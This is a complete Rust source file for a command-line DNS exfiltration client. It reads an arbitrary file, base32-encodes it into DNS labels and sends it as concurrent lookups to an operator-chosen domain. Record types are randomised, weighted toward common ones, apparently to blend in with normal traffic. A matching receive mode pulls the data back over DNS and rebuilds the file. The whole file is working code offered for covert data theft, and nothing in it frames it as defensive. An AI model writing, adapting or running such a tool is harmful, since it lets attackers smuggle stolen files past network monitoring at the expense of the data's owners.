use clap::{Parser, Subcommand};
use futures::future::join_all;
use std::fs;
use log::{error, info};
use simple_logger::SimpleLogger;
use rustleak_lib::{
    dns::*,
    utils::{decode_base32, encode_base32, split_data_into_label_chunks},
};
use std::time::Instant;
use rand::distributions::{Distribution, WeightedIndex};
use rand::thread_rng;
const MAX_ATTEMPTS: usize = 10;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,

    /// Number of threads to use
    #[arg(short, long, default_value_t = 4)]
    threads: usize,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Send data
    Send {
        #[arg(short, long)]
        code: String,

        #[arg(short, long)]
        filename: String,

        #[arg(short, long)]
        domain: String,
    },
    /// Receive data
    Receive {
        #[arg(short, long)]
        code: String,

        #[arg(short, long)]
        filename: String,

        #[arg(short, long)]
        domain: String,
    },
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    let args = Args::parse();
    let resolver = get_resolver();

    info!("Starting DNS Exfiltration client with {} threads", args.threads);

    match args.command {
        Commands::Send { code, filename, domain } => {
            match fs::read(&filename) {
            Ok(raw_bytes) => {
                info!("File {} exists and is readable", &filename);
                let labels = split_data_into_label_chunks(&raw_bytes);
                let encoded_labels = encode_base32(labels);
                let total_labels = encoded_labels.len();
            
                let start_time = Instant::now();
                let futures: Vec<_> = encoded_labels.iter().enumerate().map(|(i, label)| {
                let resolver = resolver.clone();
                let code = code.clone();
                let domain = domain.clone();
                async move {
                    let mut attempts = 0;
                    loop {
                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                    let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
            
                    match resolver.lookup(&query, get_random_record_type()).await {
                        Ok(_) => break,
                        Err(_) => {
                        attempts += 1;
                        if attempts >= MAX_ATTEMPTS {
                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
                            error!("Aborting...");
                            std::process::exit(1);
                        }
                        }
                    }
                    }
                }
                }).collect();

                join_all(futures).await;

                let elapsed = start_time.elapsed().as_secs_f32();
                let byte_rate = (raw_bytes.len() as f32) / elapsed;
                info!("Data sent successfully!");
                info!("Average byte rate: {:.1} bytes/s", byte_rate);
            }
            Err(e) => {
                error!("Error reading file: {}", e);
                return;
            }
            };
        }
        Commands::Receive { code, filename, domain } => {
            match fs::OpenOptions::new().write(true).create(true).truncate(false).open(&filename) {
                Ok(_) => info!("File {} is writable", &filename),
                Err(e) => {
                    error!("Error opening file for writing: {}", e);
                    return;
                }
            };

            let query = format!("DOWNLOAD.{}.{}", code, domain);
            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;

            let total_fragments: usize = match response {
                Ok(lookup) => {
                    let records = lookup.iter().collect::<Vec<_>>();
                    let record_data = records[0].to_string();
                    record_data.parse::<usize>().unwrap_or_else(|_| {
                        error!("Invalid fragment count response: {}", record_data);
                        std::process::exit(1);
                    })
                }
                Err(_) => {
                    error!("Failed to retrieve fragment count.");
                    return;
                }
            };

            info!("Total fragments to download: {}", total_fragments);

            let start_time = Instant::now();
            let futures: Vec<_> = (0..total_fragments).map(|seq| {
                let resolver = resolver.clone();
                let code = code.clone();
                let domain = domain.clone();
                async move {
                    let mut attempts = 0;
                    let mut data = None;
                    while attempts < MAX_ATTEMPTS {
                        let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
                        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;

                        match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
                            Ok(lookup) => {
                                let records = lookup.iter().collect::<Vec<_>>();
                                let record_data = records[0].to_string();
                                data = Some(record_data);
                                break;
                            }
                            Err(_) => {
                                attempts += 1;
                            }
                        }
                    }

                    if attempts >= MAX_ATTEMPTS {
                        error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
                        error!("Aborting...");
                        std::process::exit(1);
                    }

                    data
                }
            }).collect();

            let received_data: Vec<_> = join_all(futures).await.into_iter().flatten().collect();

            let elapsed = start_time.elapsed().as_secs_f32();
            let byte_rate = (total_fragments as f32 * 32.0) / elapsed; // Assuming each fragment is 32 bytes
            let decoded_data = decode_base32(received_data);
            let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
            fs::write(&filename, flattened_data).expect("Failed to write data to file");
            info!("Data successfully written to file: {}", filename);
            info!("Average byte rate: {:.1} bytes/s", byte_rate);
        }
    }
}

fn get_random_record_type() -> hickory_resolver::proto::rr::RecordType {
    let record_types = vec![
        hickory_resolver::proto::rr::RecordType::A,
        hickory_resolver::proto::rr::RecordType::AAAA,
        hickory_resolver::proto::rr::RecordType::CNAME,
        hickory_resolver::proto::rr::RecordType::TXT,
    ];

    let weights = vec![30, 30, 30, 10];
    let dist = WeightedIndex::new(&weights).unwrap();
    let mut rng = thread_rng();
    record_types[dist.sample(&mut rng)]
}
